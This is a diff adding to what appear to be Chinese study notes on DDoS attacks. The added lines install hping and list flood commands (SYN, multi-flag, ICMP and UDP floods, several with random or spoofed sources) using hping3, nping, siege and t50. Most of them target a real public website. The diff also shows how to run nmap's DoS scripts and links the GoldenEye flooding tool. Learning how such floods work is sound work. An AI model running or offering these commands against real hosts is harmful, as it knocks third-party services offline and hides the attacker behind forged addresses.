@@ -52,13 +52,33 @@ Application level floods主要是针对应用软件层的
 硬件防火墙是指把防火墙程序做到芯片里面，由硬件执行这些功能，能减少CPU的负担，使路由更稳定
 
 
+########################################################################
 
 
+yum -y install libpcap-devel tcl-devel
+git clone https://github.com/antirez/hping.git     #攻击模拟
+cd hping  &&  ./configure && make && make install
+netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'
+hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source www.baidu.com
+hping3 -S -P -U -p 80 --flood --rand-source www.baidu.com
+hping3 -SARFUP -p 80 --flood --rand-source www.baidu.com
+hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood www.baidu.com
+hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood www.baidu.com
+hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood www.baidu.com
+
+nmap包：
+1.nping --tcp-connect --rate=10000 -c 1000000000 -q www.baidu.com
+2.cat /usr/share/nmap/scripts/script.db
+	Entry { filename = "broadcast-avahi-dos.nse", categories = { "broadcast", "dos", "intrusive", "vuln", } }
+					脚本名					  种类(后面是具体分类)
+	使用：nmap -p22 --script=脚本名
 
 
+siege -i -c 10000 http://192.168.3.128 -A ttt
+
+t50 www.baidu.com --flood --turbo -S --protocol TCP --dport 80
+t50 www.baidu.com --flood --turbo -S TCP UDP OSPF EIGRP --dport 22
 
 
-
-
-
+https://github.com/jseidl/GoldenEye
 
